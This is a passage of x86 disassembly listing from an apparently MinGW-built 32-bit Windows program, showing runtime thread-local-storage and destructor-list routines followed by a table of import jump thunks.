  402d61:	8b 03                	mov    (%ebx),%eax
  402d63:	89 04 24             	mov    %eax,(%esp)
  402d66:	e8 d5 02 00 00       	call   0x403040
  402d6b:	83 ec 04             	sub    $0x4,%esp
  402d6e:	89 c6                	mov    %eax,%esi
  402d70:	e8 d3 02 00 00       	call   0x403048
  402d75:	85 c0                	test   %eax,%eax
  402d77:	75 0c                	jne    0x402d85
  402d79:	85 f6                	test   %esi,%esi
  402d7b:	74 08                	je     0x402d85
  402d7d:	8b 43 04             	mov    0x4(%ebx),%eax
  402d80:	89 34 24             	mov    %esi,(%esp)
  402d83:	ff d0                	call   *%eax
  402d85:	8b 5b 08             	mov    0x8(%ebx),%ebx
  402d88:	85 db                	test   %ebx,%ebx
  402d8a:	75 d5                	jne    0x402d61
  402d8c:	c7 04 24 3c 00 41 00 	movl   $0x41003c,(%esp)
  402d93:	e8 d0 02 00 00       	call   0x403068
  402d98:	83 ec 04             	sub    $0x4,%esp
  402d9b:	8d 65 f8             	lea    -0x8(%ebp),%esp
  402d9e:	5b                   	pop    %ebx
  402d9f:	5e                   	pop    %esi
  402da0:	5d                   	pop    %ebp
  402da1:	c3                   	ret
  402da2:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402da9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402db0:	55                   	push   %ebp
  402db1:	89 e5                	mov    %esp,%ebp
  402db3:	83 ec 18             	sub    $0x18,%esp
  402db6:	8b 45 0c             	mov    0xc(%ebp),%eax
  402db9:	83 f8 01             	cmp    $0x1,%eax
  402dbc:	74 42                	je     0x402e00
  402dbe:	72 11                	jb     0x402dd1
  402dc0:	83 f8 03             	cmp    $0x3,%eax
  402dc3:	75 05                	jne    0x402dca
  402dc5:	e8 66 ff ff ff       	call   0x402d30
  402dca:	b8 01 00 00 00       	mov    $0x1,%eax
  402dcf:	c9                   	leave
  402dd0:	c3                   	ret
  402dd1:	e8 5a ff ff ff       	call   0x402d30
  402dd6:	a1 38 00 41 00       	mov    0x410038,%eax
  402ddb:	83 f8 01             	cmp    $0x1,%eax
  402dde:	75 ea                	jne    0x402dca
  402de0:	c7 05 38 00 41 00 00 	movl   $0x0,0x410038
  402de7:	00 00 00 
  402dea:	c7 04 24 3c 00 41 00 	movl   $0x41003c,(%esp)
  402df1:	e8 5a 02 00 00       	call   0x403050
  402df6:	83 ec 04             	sub    $0x4,%esp
  402df9:	eb cf                	jmp    0x402dca
  402dfb:	90                   	nop
  402dfc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402e00:	a1 38 00 41 00       	mov    0x410038,%eax
  402e05:	85 c0                	test   %eax,%eax
  402e07:	74 17                	je     0x402e20
  402e09:	c7 05 38 00 41 00 01 	movl   $0x1,0x410038
  402e10:	00 00 00 
  402e13:	b8 01 00 00 00       	mov    $0x1,%eax
  402e18:	c9                   	leave
  402e19:	c3                   	ret
  402e1a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402e20:	c7 04 24 3c 00 41 00 	movl   $0x41003c,(%esp)
  402e27:	e8 2c 02 00 00       	call   0x403058
  402e2c:	83 ec 04             	sub    $0x4,%esp
  402e2f:	eb d8                	jmp    0x402e09
  402e31:	eb 0d                	jmp    0x402e40
  402e33:	90                   	nop
  402e34:	90                   	nop
  402e35:	90                   	nop
  402e36:	90                   	nop
  402e37:	90                   	nop
  402e38:	90                   	nop
  402e39:	90                   	nop
  402e3a:	90                   	nop
  402e3b:	90                   	nop
  402e3c:	90                   	nop
  402e3d:	90                   	nop
  402e3e:	90                   	nop
  402e3f:	90                   	nop
  402e40:	55                   	push   %ebp
  402e41:	89 e5                	mov    %esp,%ebp
  402e43:	53                   	push   %ebx
  402e44:	83 ec 14             	sub    $0x14,%esp
  402e47:	a1 38 00 41 00       	mov    0x410038,%eax
  402e4c:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402e4f:	85 c0                	test   %eax,%eax
  402e51:	75 0d                	jne    0x402e60
  402e53:	31 c0                	xor    %eax,%eax
  402e55:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402e58:	c9                   	leave
  402e59:	c3                   	ret
  402e5a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402e60:	c7 04 24 3c 00 41 00 	movl   $0x41003c,(%esp)
  402e67:	e8 f4 01 00 00       	call   0x403060
  402e6c:	a1 54 00 41 00       	mov    0x410054,%eax
  402e71:	83 ec 04             	sub    $0x4,%esp
  402e74:	85 c0                	test   %eax,%eax
  402e76:	74 17                	je     0x402e8f
  402e78:	8b 10                	mov    (%eax),%edx
  402e7a:	39 da                	cmp    %ebx,%edx
  402e7c:	75 08                	jne    0x402e86
  402e7e:	eb 44                	jmp    0x402ec4
  402e80:	8b 10                	mov    (%eax),%edx
  402e82:	39 da                	cmp    %ebx,%edx
  402e84:	74 1f                	je     0x402ea5
  402e86:	89 c1                	mov    %eax,%ecx
  402e88:	8b 40 08             	mov    0x8(%eax),%eax
  402e8b:	85 c0                	test   %eax,%eax
  402e8d:	75 f1                	jne    0x402e80
  402e8f:	c7 04 24 3c 00 41 00 	movl   $0x41003c,(%esp)
  402e96:	e8 cd 01 00 00       	call   0x403068
  402e9b:	83 ec 04             	sub    $0x4,%esp
  402e9e:	31 c0                	xor    %eax,%eax
  402ea0:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402ea3:	c9                   	leave
  402ea4:	c3                   	ret
  402ea5:	8b 50 08             	mov    0x8(%eax),%edx
  402ea8:	89 51 08             	mov    %edx,0x8(%ecx)
  402eab:	89 04 24             	mov    %eax,(%esp)
  402eae:	e8 fd 00 00 00       	call   0x402fb0
  402eb3:	c7 04 24 3c 00 41 00 	movl   $0x41003c,(%esp)
  402eba:	e8 a9 01 00 00       	call   0x403068
  402ebf:	83 ec 04             	sub    $0x4,%esp
  402ec2:	eb da                	jmp    0x402e9e
  402ec4:	8b 50 08             	mov    0x8(%eax),%edx
  402ec7:	89 15 54 00 41 00    	mov    %edx,0x410054
  402ecd:	eb dc                	jmp    0x402eab
  402ecf:	90                   	nop
  402ed0:	55                   	push   %ebp
  402ed1:	89 e5                	mov    %esp,%ebp
  402ed3:	53                   	push   %ebx
  402ed4:	83 ec 14             	sub    $0x14,%esp
  402ed7:	a1 38 00 41 00       	mov    0x410038,%eax
  402edc:	85 c0                	test   %eax,%eax
  402ede:	75 05                	jne    0x402ee5
  402ee0:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402ee3:	c9                   	leave
  402ee4:	c3                   	ret
  402ee5:	c7 44 24 04 0c 00 00 	movl   $0xc,0x4(%esp)
  402eec:	00 
  402eed:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  402ef4:	e8 bf 00 00 00       	call   0x402fb8
  402ef9:	89 c3                	mov    %eax,%ebx
  402efb:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402f00:	85 db                	test   %ebx,%ebx
  402f02:	74 dc                	je     0x402ee0
  402f04:	8b 45 08             	mov    0x8(%ebp),%eax
  402f07:	c7 04 24 3c 00 41 00 	movl   $0x41003c,(%esp)
  402f0e:	89 03                	mov    %eax,(%ebx)
  402f10:	8b 45 0c             	mov    0xc(%ebp),%eax
  402f13:	89 43 04             	mov    %eax,0x4(%ebx)
  402f16:	e8 45 01 00 00       	call   0x403060
  402f1b:	a1 54 00 41 00       	mov    0x410054,%eax
  402f20:	89 1d 54 00 41 00    	mov    %ebx,0x410054
  402f26:	89 43 08             	mov    %eax,0x8(%ebx)
  402f29:	83 ec 04             	sub    $0x4,%esp
  402f2c:	c7 04 24 3c 00 41 00 	movl   $0x41003c,(%esp)
  402f33:	e8 30 01 00 00       	call   0x403068
  402f38:	31 c0                	xor    %eax,%eax
  402f3a:	83 ec 04             	sub    $0x4,%esp
  402f3d:	eb a1                	jmp    0x402ee0
  402f3f:	90                   	nop
  402f40:	ff 25 4c 11 41 00    	jmp    *0x41114c
  402f46:	90                   	nop
  402f47:	90                   	nop
  402f48:	ff 25 54 11 41 00    	jmp    *0x411154
  402f4e:	90                   	nop
  402f4f:	90                   	nop
  402f50:	ff 25 50 11 41 00    	jmp    *0x411150
  402f56:	90                   	nop
  402f57:	90                   	nop
  402f58:	ff 25 5c 11 41 00    	jmp    *0x41115c
  402f5e:	90                   	nop
  402f5f:	90                   	nop
  402f60:	ff 25 68 11 41 00    	jmp    *0x411168
  402f66:	90                   	nop
  402f67:	90                   	nop
  402f68:	ff 25 94 11 41 00    	jmp    *0x411194
  402f6e:	90                   	nop
  402f6f:	90                   	nop
  402f70:	ff 25 84 11 41 00    	jmp    *0x411184
  402f76:	90                   	nop
  402f77:	90                   	nop
  402f78:	ff 25 90 11 41 00    	jmp    *0x411190
  402f7e:	90                   	nop
  402f7f:	90                   	nop
  402f80:	ff 25 8c 11 41 00    	jmp    *0x41118c
  402f86:	90                   	nop
  402f87:	90                   	nop
  402f88:	ff 25 88 11 41 00    	jmp    *0x411188
  402f8e:	90                   	nop
  402f8f:	90                   	nop
  402f90:	ff 25 98 11 41 00    	jmp    *0x411198
  402f96:	90                   	nop
  402f97:	90                   	nop
  402f98:	ff 25 80 11 41 00    	jmp    *0x411180
  402f9e:	90                   	nop
  402f9f:	90                   	nop
  402fa0:	ff 25 9c 11 41 00    	jmp    *0x41119c
  402fa6:	90                   	nop
  402fa7:	90                   	nop
  402fa8:	ff 25 70 11 41 00    	jmp    *0x411170
  402fae:	90                   	nop
  402faf:	90                   	nop
  402fb0:	ff 25 7c 11 41 00    	jmp    *0x41117c
  402fb6:	90                   	nop
  402fb7:	90                   	nop
  402fb8:	ff 25 78 11 41 00    	jmp    *0x411178
  402fbe:	90                   	nop
  402fbf:	90                   	nop
  402fc0:	ff 25 30 11 41 00    	jmp    *0x411130
  402fc6:	90                   	nop
  402fc7:	90                   	nop
  402fc8:	ff 25 f8 10 41 00    	jmp    *0x4110f8
  402fce:	90                   	nop
  402fcf:	90                   	nop
  402fd0:	ff 25 08 11 41 00    	jmp    *0x411108
  402fd6:	90                   	nop
  402fd7:	90                   	nop
  402fd8:	ff 25 0c 11 41 00    	jmp    *0x41110c
  402fde:	90                   	nop
  402fdf:	90                   	nop
  402fe0:	ff 25 40 11 41 00    	jmp    *0x411140
  402fe6:	90                   	nop
  402fe7:	90                   	nop
  402fe8:	ff 25 2c 11 41 00    	jmp    *0x41112c
  402fee:	90                   	nop
  402fef:	90                   	nop
  402ff0:	ff 25 24 11 41 00    	jmp    *0x411124
  402ff6:	90                   	nop
  402ff7:	90                   	nop
  402ff8:	ff 25 18 11 41 00    	jmp    *0x411118
  402ffe:	90                   	nop
  402fff:	90                   	nop
  403000:	ff 25 38 11 41 00    	jmp    *0x411138
  403006:	90                   	nop
  403007:	90                   	nop
  403008:	ff 25 fc 10 41 00    	jmp    *0x4110fc
  40300e:	90                   	nop
  40300f:	90                   	nop
  403010:	ff 25 3c 11 41 00    	jmp    *0x41113c
  403016:	90                   	nop
  403017:	90                   	nop
  403018:	ff 25 10 11 41 00    	jmp    *0x411110
  40301e:	90                   	nop
  40301f:	90                   	nop
  403020:	ff 25 1c 11 41 00    	jmp    *0x41111c
  403026:	90                   	nop
  403027:	90                   	nop
  403028:	ff 25 44 11 41 00    	jmp    *0x411144
  40302e:	90                   	nop
  40302f:	90                   	nop
  403030:	ff 25 00 11 41 00    	jmp    *0x411100
  403036:	90                   	nop
  403037:	90                   	nop
  403038:	ff 25 14 11 41 00    	jmp    *0x411114
  40303e:	90                   	nop
  40303f:	90                   	nop
  403040:	ff 25 34 11 41 00    	jmp    *0x411134
  403046:	90                   	nop
  403047:	90                   	nop
  403048:	ff 25 04 11 41 00    	jmp    *0x411104
  40304e:	90                   	nop
  40304f:	90                   	nop
  403050:	ff 25 f0 10 41 00    	jmp    *0x4110f0
  403056:	90                   	nop
  403057:	90                   	nop
  403058:	ff 25 20 11 41 00    	jmp    *0x411120
  40305e:	90                   	nop
  40305f:	90                   	nop
  403060:	ff 25 f4 10 41 00    	jmp    *0x4110f4
  403066:	90                   	nop
  403067:	90                   	nop
  403068:	ff 25 28 11 41 00    	jmp    *0x411128
  40306e:	90                   	nop
  40306f:	90                   	nop
  403070:	55                   	push   %ebp
  403071:	89 e5                	mov    %esp,%ebp
  403073:	83 ec 18             	sub    $0x18,%esp
  403076:	e8 65 e2 ff ff       	call   0x4012e0
  40307b:	c7 04 24 30 13 40 00 	movl   $0x401330,(%esp)
  403082:	e8 79 df ff ff       	call   0x401000
  403087:	c9                   	leave
  403088:	c3                   	ret
  403089:	90                   	nop
  40308a:	90                   	nop
  40308b:	90                   	nop
  40308c:	90                   	nop
  40308d:	90                   	nop
  40308e:	90                   	nop
  40308f:	90                   	nop
  403090:	ff                   	(bad)
  403091:	ff                   	(bad)
  403092:	ff                   	(bad)
  403093:	ff 70 30             	push   0x30(%eax)
  403096:	40                   	inc    %eax
  403097:	00 00                	add    %al,(%eax)
  403099:	00 00                	add    %al,(%eax)
  40309b:	00 ff                	add    %bh,%bh
  40309d:	ff                   	(bad)
  40309e:	ff                   	(bad)
  40309f:	ff 00                	incl   (%eax)
  4030a1:	00 00                	add    %al,(%eax)
	...
